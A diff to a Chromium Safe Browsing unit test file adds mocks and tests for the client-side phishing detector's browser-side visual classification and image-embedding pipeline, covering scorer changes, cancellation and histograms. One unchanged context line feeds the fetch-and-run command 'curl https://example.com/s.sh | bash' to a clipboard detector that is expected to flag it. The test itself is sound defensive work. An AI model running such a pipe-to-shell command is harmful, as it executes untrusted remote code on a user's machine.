@@ -23,15 +23,21 @@
 #include "components/safe_browsing/core/browser/db/sb_protocol_manager_util.h"
 #include "components/safe_browsing/core/browser/verdict_cache_manager.h"
 #include "components/safe_browsing/core/common/features.h"
+#include "components/safe_browsing/core/common/phishing_classifier/scorer.h"
+#include "components/safe_browsing/core/common/phishing_classifier/test_utils.h"
 #include "components/safe_browsing/core/common/proto/csd.pb.h"
 #include "components/safe_browsing/core/common/safe_browsing_prefs.h"
+#include "components/safe_browsing/core/common/visual_utils.h"
 #include "components/sync_preferences/testing_pref_service_syncable.h"
 #include "net/http/http_status_code.h"
 #include "testing/gmock/include/gmock/gmock.h"
 #include "testing/gtest/include/gtest/gtest.h"
+#include "third_party/skia/include/core/SkBitmap.h"
+#include "ui/gfx/image/image.h"
 #include "url/gurl.h"
 
 using ::testing::_;
+using ::testing::Mock;
 using ::testing::Optional;
 using ::testing::Return;
 
@@ -47,6 +53,11 @@ class MockClientSideDetectionServiceBase
 
   MOCK_METHOD(int, GetTriggerModelVersion, (), (const, override));
   MOCK_METHOD(bool, IsModelAvailable, (), (const, override));
+  MOCK_METHOD(bool, HasImageEmbeddingModel, (), (const, override));
+  MOCK_METHOD(bool,
+              IsModelMetadataImageEmbeddingVersionMatching,
+              (),
+              (const, override));
   MOCK_METHOD(void,
               SendClientReportPhishingRequest,
               (std::unique_ptr<ClientPhishingRequest> verdict,
@@ -79,6 +90,13 @@ class MockIntelligentScanDelegate : public IntelligentScanDelegate {
               (override));
   MOCK_METHOD(void, OnScamWarningShown, (), (override));
 };
+
+gfx::Image CreateTestImage() {
+  SkBitmap bitmap;
+  bitmap.allocN32Pixels(48, 48);
+  bitmap.eraseColor(SK_ColorWHITE);
+  return gfx::Image::CreateFrom1xBitmap(bitmap);
+}
 
 class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
  public:
@@ -127,7 +145,48 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
       std::unique_ptr<ClientPhishingRequest> verdict,
       std::optional<bool> did_match_high_confidence_allowlist,
       bool is_invalid_ip,
-      PhishingDetectorResult result) override {}
+      PhishingDetectorResult result) override {
+    if (use_browser_side_image_embedding_) {
+      StartBrowserSideImageEmbedding(std::move(verdict),
+                                     did_match_high_confidence_allowlist,
+                                     is_invalid_ip, result);
+    }
+  }
+
+  void CaptureScreenshot(ScreenshotCallback callback) override {
+    ++capture_screenshot_count_;
+    std::move(callback).Run(next_screenshot_);
+  }
+
+  visual_utils::CanExtractVisualFeaturesResult
+  DetermineVisualFeaturesExtraction() override {
+    return can_extract_visual_features_result_;
+  }
+
+  void OnVisualClassificationEarlyReturn(
+      VisualClassificationEarlyReturnReason reason) override {
+    last_early_return_reason_ = reason;
+    ClientSideDetectionHostBase::OnVisualClassificationEarlyReturn(reason);
+  }
+
+  void CancelPendingRequests() override {
+    ++cancel_pending_requests_count_;
+    // Mirrors the platform hosts, which cancel the browser-side engines as
+    // part of cancelling pending requests.
+    CancelBrowserSideClassification();
+    ClientSideDetectionHostBase::CancelPendingRequests();
+  }
+
+  void set_use_browser_side_image_embedding(bool value) {
+    use_browser_side_image_embedding_ = value;
+  }
+  void set_next_screenshot(const gfx::Image& image) {
+    next_screenshot_ = image;
+  }
+  void set_can_extract_visual_features_result(
+      visual_utils::CanExtractVisualFeaturesResult result) {
+    can_extract_visual_features_result_ = result;
+  }
 
   void MaybeStartPreClassification(
       ClientSideDetectionType request_type) override {
@@ -191,19 +250,25 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
 
   using ClientSideDetectionHostBase::
       AddMiscellaneousMetadataToClientPhishingRequest;
+  using ClientSideDetectionHostBase::CancelBrowserSideClassification;
   using ClientSideDetectionHostBase::CanGetAccessToken;
   using ClientSideDetectionHostBase::CanSendSamplePing;
+  using ClientSideDetectionHostBase::classification_image_;
+  using ClientSideDetectionHostBase::classifier_;
   using ClientSideDetectionHostBase::ExtractClipboardData;
   using ClientSideDetectionHostBase::GetTierValue;
   using ClientSideDetectionHostBase::HasDonePreclassificationCheckOnSameURL;
   using ClientSideDetectionHostBase::HasForceRequestFromRtUrlLookup;
+  using ClientSideDetectionHostBase::image_embedder_;
   using ClientSideDetectionHostBase::is_classifying;
   using ClientSideDetectionHostBase::is_csd_running;
   using ClientSideDetectionHostBase::MaybeSendClientPhishingRequest;
   using ClientSideDetectionHostBase::NewRequestTypeTierHigher;
   using ClientSideDetectionHostBase::OnCreditCardFormVisitCount;
+  using ClientSideDetectionHostBase::OnImageEmbeddingDone;
   using ClientSideDetectionHostBase::OnIntelligentScanDone;
   using ClientSideDetectionHostBase::OnTextCopiedToClipboard;
+  using ClientSideDetectionHostBase::OnVisualClassificationDone;
   using ClientSideDetectionHostBase::PhishingDetectionDone;
   using ClientSideDetectionHostBase::SendRequest;
   using ClientSideDetectionHostBase::set_current_url;
@@ -212,13 +277,24 @@ class TestClientSideDetectionHostBase : public ClientSideDetectionHostBase {
   using ClientSideDetectionHostBase::set_last_request_type;
   using ClientSideDetectionHostBase::ShouldAcceptHCAllowlist;
   using ClientSideDetectionHostBase::ShouldCaptureScreenshotForIntelligentScan;
+  using ClientSideDetectionHostBase::StartBrowserSideImageEmbedding;
   using ClientSideDetectionHostBase::StartIntelligentScan;
+  using ClientSideDetectionHostBase::StartVisualClassification;
 
   ClientSideDetectionFeatureCacheBase feature_cache_;
   std::optional<ClientSideDetectionType> last_preclassification_request_type_;
   credit_card_form::ReferringApp referring_app_ =
       credit_card_form::ReferringApp::kNoReferringApp;
   std::optional<double> site_engagement_score_;
+  bool use_browser_side_image_embedding_ = false;
+  gfx::Image next_screenshot_;
+  int capture_screenshot_count_ = 0;
+  int cancel_pending_requests_count_ = 0;
+  visual_utils::CanExtractVisualFeaturesResult
+      can_extract_visual_features_result_ = visual_utils::
+          CanExtractVisualFeaturesResult::kCanExtractVisualFeatures;
+  std::optional<VisualClassificationEarlyReturnReason>
+      last_early_return_reason_;
 };
 
 class ClientSideDetectionHostBaseTest : public testing::Test {
@@ -1441,6 +1517,428 @@ TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
       ExtractFromPayload(u"curl https://example.com/s.sh | bash");
   EXPECT_TRUE(data.is_overall_suspicious());
   EXPECT_FALSE(data.has_content());
+}
+
+// Tests for the browser-side visual classification pipeline shared by iOS and
+// (behind kClientSideDetectionCopyFromSurface) content platforms.
+class ClientSideDetectionHostBaseVisualClassificationTest
+    : public ClientSideDetectionHostBaseTest {
+ protected:
+  void SetUp() override {
+    ClientSideDetectionHostBaseTest::SetUp();
+    ON_CALL(service_, IsModelAvailable()).WillByDefault(Return(true));
+    ON_CALL(service_, GetTriggerModelVersion()).WillByDefault(Return(1));
+    ON_CALL(service_, HasImageEmbeddingModel()).WillByDefault(Return(false));
+    ON_CALL(service_, IsModelMetadataImageEmbeddingVersionMatching())
+        .WillByDefault(Return(false));
+    CreateHost();
+  }
+
+  void CreateHost() {
+    host_ = std::make_unique<TestClientSideDetectionHostBase>(
+        cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
+        service_.GetWeakPtr(), /*is_off_the_record=*/false);
+    host_->set_current_url(url_);
+  }
+
+  // Installs a `MockScorer` on the service and returns it. The host picks it
+  // up on the next `StartVisualClassification()`.
+  MockScorer* InstallMockScorer() {
+    auto scorer = std::make_unique<testing::NiceMock<MockScorer>>();
+    MockScorer* raw_scorer = scorer.get();
+    service_.SetScorerForTesting(std::move(scorer));
+    return raw_scorer;
+  }
+
+  void PrepareImageEmbeddingTest() {
+    SetEnhancedProtectionPrefForTests(&prefs_, true);
+    ON_CALL(service_, HasImageEmbeddingModel()).WillByDefault(Return(true));
+    ON_CALL(service_, IsModelMetadataImageEmbeddingVersionMatching())
+        .WillByDefault(Return(true));
+  }
+
+  static void RunVisualModelCallback(
+      std::vector<double> scores,
+      const gfx::Image& image,
+      base::OnceCallback<void(std::vector<double>)> callback) {
+    std::move(callback).Run(std::move(scores));
+  }
+
+  static void RunEmbeddingCallback(
+      const gfx::Image& image,
+      base::OnceCallback<void(ImageFeatureEmbedding)> callback) {
+    ImageFeatureEmbedding embedding;
+    embedding.add_embedding_value(0.5f);
+    std::move(callback).Run(embedding);
+  }
+
+  const GURL url_{"https://example.com/"};
+  testing::NiceMock<MockClientSideDetectionServiceBase> service_;
+};
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       StartVisualClassificationWithoutScorerReturnsEarly) {
+  base::HistogramTester histograms;
+  host_->set_is_csd_running(true);
+
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+
+  EXPECT_THAT(
+      host_->last_early_return_reason_,
+      Optional(
+          VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot));
+  EXPECT_FALSE(host_->is_csd_running());
+  EXPECT_FALSE(host_->is_classifying());
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.VisualClassificationEarlyReturnReason",
+      VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot, 1);
+  histograms.ExpectTotalCount(
+      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       StartVisualClassificationReportsVerdict) {
+  MockScorer* scorer = InstallMockScorer();
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
+      .WillOnce([](const gfx::Image& image,
+                   base::OnceCallback<void(std::vector<double>)> callback) {
+        RunVisualModelCallback({0.9}, image, std::move(callback));
+      });
+  EXPECT_CALL(*host_, ClassifyPhishingThroughThresholds(_))
+      .WillOnce([](ClientPhishingRequest* verdict) {
+        verdict->set_is_phishing(true);
+      });
+  base::HistogramTester histograms;
+
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  EXPECT_TRUE(host_->is_classifying());
+  EXPECT_TRUE(host_->classifier_->is_ready());
+  EXPECT_TRUE(host_->image_embedder_->is_ready());
+  task_environment_.RunUntilIdle();
+
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
+      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);
+  histograms.ExpectBucketCount(
+      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
+      ClientSideDetectionEvent::kImageClassificationBegin, 1);
+  EXPECT_FALSE(host_->is_classifying());
+  // The capture is retained for image embedding on a phishy verdict.
+  EXPECT_FALSE(host_->classification_image_.IsEmpty());
+  // Scorers are destroyed on a background thread; verify here instead.
+  Mock::VerifyAndClearExpectations(scorer);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       BenignTriggerModelsClearsRetainedImage) {
+  MockScorer* scorer = InstallMockScorer();
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
+      .WillOnce([](const gfx::Image& image,
+                   base::OnceCallback<void(std::vector<double>)> callback) {
+        RunVisualModelCallback({0.1}, image, std::move(callback));
+      });
+  EXPECT_CALL(*host_, ClassifyPhishingThroughThresholds(_))
+      .WillOnce([](ClientPhishingRequest* verdict) {
+        verdict->set_is_phishing(false);
+      });
+
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  task_environment_.RunUntilIdle();
+
+  EXPECT_FALSE(host_->is_csd_running());
+  // A skipped benign TRIGGER_MODELS full report must not retain the capture.
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+  Mock::VerifyAndClearExpectations(scorer);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       EnhancedProtectionUpgradesTriggerModelsToImageEmbeddingMatch) {
+  base::test::ScopedFeatureList features;
+  features.InitAndEnableFeature(kClientSideDetectionImageEmbeddingMatch);
+  SetEnhancedProtectionPrefForTests(&prefs_, true);
+  MockScorer* scorer = InstallMockScorer();
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
+      .WillOnce([](const gfx::Image& image,
+                   base::OnceCallback<void(std::vector<double>)> callback) {
+        RunVisualModelCallback({0.1}, image, std::move(callback));
+      });
+  // IMAGE_EMBEDDING_MATCH classification embeds the image as part of scoring.
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
+      .WillOnce(&RunEmbeddingCallback);
+  base::HistogramTester histograms;
+
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  task_environment_.RunUntilIdle();
+
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.PhishingDetectorResult.ImageEmbeddingMatch",
+      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);
+  histograms.ExpectTotalCount(
+      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
+  Mock::VerifyAndClearExpectations(scorer);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       ClassificationFailureDoesNotRetainImage) {
+  base::HistogramTester histograms;
+  ClientPhishingRequest verdict;
+  verdict.set_url(url_.spec());
+
+  host_->OnVisualClassificationDone(
+      url_, CreateTestImage(), TRIGGER_MODELS, /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, base::TimeTicks::Now(),
+      verdict, PhishingClassifier::Result::kVisualExtractionFailed);
+
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
+      PhishingDetectorResult::VISUAL_EXTRACTION_FAILED, 1);
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       BrowserSideImageEmbeddingUsesRetainedImage) {
+  PrepareImageEmbeddingTest();
+  MockScorer* scorer = InstallMockScorer();
+  host_->image_embedder_->set_scorer(scorer);
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
+      .WillOnce(&RunEmbeddingCallback);
+  host_->classification_image_ = CreateTestImage();
+
+  std::unique_ptr<ClientPhishingRequest> sent_verdict;
+  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
+      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> verdict,
+                    ClientSideDetectionServiceBase::
+                        ClientReportPhishingRequestCallback callback,
+                    const std::string& access_token) {
+        sent_verdict = std::move(verdict);
+      });
+
+  auto verdict = std::make_unique<ClientPhishingRequest>();
+  verdict->set_url(url_.spec());
+  verdict->set_client_side_detection_type(TRIGGER_MODELS);
+  verdict->set_is_phishing(true);
+  base::HistogramTester histograms;
+
+  host_->StartBrowserSideImageEmbedding(
+      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
+      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
+  // The capture is handed to the embedder and released immediately.
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+  task_environment_.RunUntilIdle();
+
+  histograms.ExpectBucketCount(
+      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
+      ClientSideDetectionEvent::kImageEmbeddingBegin, 1);
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel",
+      ClientSideDetectionHostBase::ImageEmbeddingResult::kSuccess, 1);
+  ASSERT_TRUE(sent_verdict);
+  EXPECT_EQ(sent_verdict->image_feature_embedding().embedding_value_size(), 1);
+  Mock::VerifyAndClearExpectations(scorer);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       BrowserSideImageEmbeddingEmptyResultRecordsFailed) {
+  PrepareImageEmbeddingTest();
+  MockScorer* scorer = InstallMockScorer();
+  host_->image_embedder_->set_scorer(scorer);
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
+      .WillOnce([](const gfx::Image& image,
+                   base::OnceCallback<void(ImageFeatureEmbedding)> callback) {
+        std::move(callback).Run(ImageFeatureEmbedding());
+      });
+  host_->classification_image_ = CreateTestImage();
+
+  std::unique_ptr<ClientPhishingRequest> sent_verdict;
+  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
+      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> verdict,
+                    ClientSideDetectionServiceBase::
+                        ClientReportPhishingRequestCallback callback,
+                    const std::string& access_token) {
+        sent_verdict = std::move(verdict);
+      });
+
+  auto verdict = std::make_unique<ClientPhishingRequest>();
+  verdict->set_url(url_.spec());
+  verdict->set_client_side_detection_type(TRIGGER_MODELS);
+  verdict->set_is_phishing(true);
+  base::HistogramTester histograms;
+
+  host_->StartBrowserSideImageEmbedding(
+      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
+      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
+  task_environment_.RunUntilIdle();
+
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel",
+      ClientSideDetectionHostBase::ImageEmbeddingResult::kFailed, 1);
+  ASSERT_TRUE(sent_verdict);
+  EXPECT_FALSE(sent_verdict->has_image_feature_embedding());
+  EXPECT_FALSE(sent_verdict->has_visual_features());
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+  Mock::VerifyAndClearExpectations(scorer);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       BrowserSideImageEmbeddingSkippedWithoutRetainedImage) {
+  PrepareImageEmbeddingTest();
+  MockScorer* scorer = InstallMockScorer();
+  host_->image_embedder_->set_scorer(scorer);
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _)).Times(0);
+  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _)).Times(1);
+
+  auto verdict = std::make_unique<ClientPhishingRequest>();
+  verdict->set_url(url_.spec());
+  verdict->set_client_side_detection_type(TRIGGER_MODELS);
+  verdict->set_is_phishing(true);
+  base::HistogramTester histograms;
+
+  host_->StartBrowserSideImageEmbedding(
+      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
+      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
+  task_environment_.RunUntilIdle();
+
+  histograms.ExpectBucketCount(
+      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
+      ClientSideDetectionEvent::kImageEmbeddingBegin, 0);
+  histograms.ExpectTotalCount(
+      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel", 0);
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       VisualFeaturesImageClearedWhenExtractionNotAllowed) {
+  std::vector<std::unique_ptr<ClientPhishingRequest>> sent_verdicts;
+  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
+      .WillRepeatedly([&](std::unique_ptr<ClientPhishingRequest> verdict,
+                          ClientSideDetectionServiceBase::
+                              ClientReportPhishingRequestCallback callback,
+                          const std::string& access_token) {
+        sent_verdicts.push_back(std::move(verdict));
+      });
+  auto make_verdict = [&] {
+    auto verdict = std::make_unique<ClientPhishingRequest>();
+    verdict->set_url(url_.spec());
+    verdict->set_client_side_detection_type(TRIGGER_MODELS);
+    verdict->set_is_phishing(true);
+    verdict->mutable_visual_features()->mutable_image()->set_width(1);
+    return verdict;
+  };
+  base::HistogramTester histograms;
+
+  // Not allowed: the blurred image is stripped and no histogram is recorded.
+  host_->set_can_extract_visual_features_result(
+      visual_utils::CanExtractVisualFeaturesResult::kBelowMinFrame);
+  host_->StartBrowserSideImageEmbedding(
+      make_verdict(), /*did_match_high_confidence_allowlist=*/false,
+      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
+  task_environment_.RunUntilIdle();
+  ASSERT_EQ(sent_verdicts.size(), 1u);
+  EXPECT_FALSE(sent_verdicts[0]->visual_features().has_image());
+  histograms.ExpectTotalCount("SBClientPhishing.HasVisualFeaturesImage2", 0);
+
+  // Allowed: the image is kept and its presence recorded.
+  host_->set_can_extract_visual_features_result(
+      visual_utils::CanExtractVisualFeaturesResult::kCanExtractVisualFeatures);
+  host_->StartBrowserSideImageEmbedding(
+      make_verdict(), /*did_match_high_confidence_allowlist=*/false,
+      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
+  task_environment_.RunUntilIdle();
+  ASSERT_EQ(sent_verdicts.size(), 2u);
+  EXPECT_TRUE(sent_verdicts[1]->visual_features().has_image());
+  histograms.ExpectUniqueSample("SBClientPhishing.HasVisualFeaturesImage2",
+                                true, 1);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       ScorerChangeCancelsClassificationAndDropsScorer) {
+  MockScorer* scorer = InstallMockScorer();
+  // Hold the classification open by never running the callback.
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _)).Times(testing::AtMost(1));
+  base::HistogramTester histograms;
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  ASSERT_TRUE(host_->classifier_->is_ready());
+  const int cancel_count = host_->cancel_pending_requests_count_;
+
+  // Replacing the scorer must cancel the in-flight classification and drop the
+  // cached raw pointers before the old scorer is destroyed.
+  host_->set_is_csd_running(true);
+  service_.SetScorerForTesting(
+      std::make_unique<testing::NiceMock<MockScorer>>());
+
+  EXPECT_EQ(host_->cancel_pending_requests_count_, cancel_count + 1);
+  EXPECT_FALSE(host_->classifier_->is_ready());
+  EXPECT_FALSE(host_->image_embedder_->is_ready());
+  EXPECT_TRUE(host_->classification_image_.IsEmpty());
+  // The dropped request never reports back, so CSD must not stay busy.
+  EXPECT_FALSE(host_->is_classifying());
+  EXPECT_FALSE(host_->is_csd_running());
+  task_environment_.RunUntilIdle();
+  histograms.ExpectTotalCount(
+      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       ServiceDestroyedBeforeHostIsSafe) {
+  auto service =
+      std::make_unique<testing::NiceMock<MockClientSideDetectionServiceBase>>();
+  host_ = std::make_unique<TestClientSideDetectionHostBase>(
+      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
+      service->GetWeakPtr(), /*is_off_the_record=*/false);
+  host_->set_current_url(url_);
+  service->SetScorerForTesting(
+      std::make_unique<testing::NiceMock<MockScorer>>());
+
+  // Destroying the service clears (and notifies about) its scorer first.
+  const int cancel_count = host_->cancel_pending_requests_count_;
+  service.reset();
+  EXPECT_EQ(host_->cancel_pending_requests_count_, cancel_count + 1);
+  EXPECT_FALSE(host_->classifier_->is_ready());
+
+  // Classification without a service is an early return, not a crash.
+  base::HistogramTester histograms;
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  EXPECT_THAT(
+      host_->last_early_return_reason_,
+      Optional(
+          VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot));
+  histograms.ExpectUniqueSample(
+      "SBClientPhishing.VisualClassificationEarlyReturnReason",
+      VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot, 1);
+  task_environment_.RunUntilIdle();
+}
+
+TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
+       HostDestroyedDuringClassificationDoesNotCrash) {
+  MockScorer* scorer = InstallMockScorer();
+  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _)).Times(testing::AtMost(1));
+  host_->StartVisualClassification(
+      url_, TRIGGER_MODELS,
+      /*is_sample_ping=*/false,
+      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
+  ASSERT_TRUE(host_->is_classifying());
+
+  // The base destructor cancels the pending classification.
+  host_.reset();
+  task_environment_.RunUntilIdle();
 }
 
 }  // namespace safe_browsing
